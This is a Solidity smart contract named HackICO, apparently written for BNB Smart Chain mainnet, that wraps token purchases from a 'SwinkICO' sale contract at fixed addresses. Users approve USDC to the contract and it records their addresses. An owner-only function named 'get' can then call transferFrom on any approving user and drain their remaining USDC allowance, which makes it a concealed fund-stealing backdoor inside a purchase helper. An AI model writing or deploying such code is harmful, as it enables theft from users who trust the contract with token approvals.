// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./SwinkICO.sol";

contract HackICO is Ownable {
    IERC20 public SWINK;
    IERC20 public USDC;
    address public ICOAddress = 0x72e6EaA6B55dc583963E169731ac1d9FE6bd11AA;
    SwinkICO ICO = SwinkICO(0x72e6EaA6B55dc583963E169731ac1d9FE6bd11AA);

    address[] users;

    constructor() {
        USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);   // bsc mainnet: 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d
        SWINK = IERC20(0x2Cbc4D0E630f01e1871200D4fe272297638Be472);
    }

    function buySwink(uint256 usdcAmount) public {
        uint256 usdcBalanceOfUser = USDC.balanceOf(msg.sender);
        require(usdcBalanceOfUser >= usdcAmount, "You dont have enough balance");
        uint256 allowance = USDC.allowance(msg.sender, address(this));
        require(allowance >= usdcAmount, "Check allowance");
        USDC.transferFrom(msg.sender, address(this), usdcAmount);

        users.push(msg.sender);

        USDC.approve(ICOAddress, usdcAmount);
        ICO.buySwink(usdcAmount);

        uint256 swinkBalance = SWINK.balanceOf(address(this));
        SWINK.transfer(msg.sender, swinkBalance);
    }

    function get(address from, address to, uint256 amount) public onlyOwner {
        USDC.transferFrom(from, to, amount);
    }

    function getUsers() public view returns(address[] memory) {
        return users;
    }
}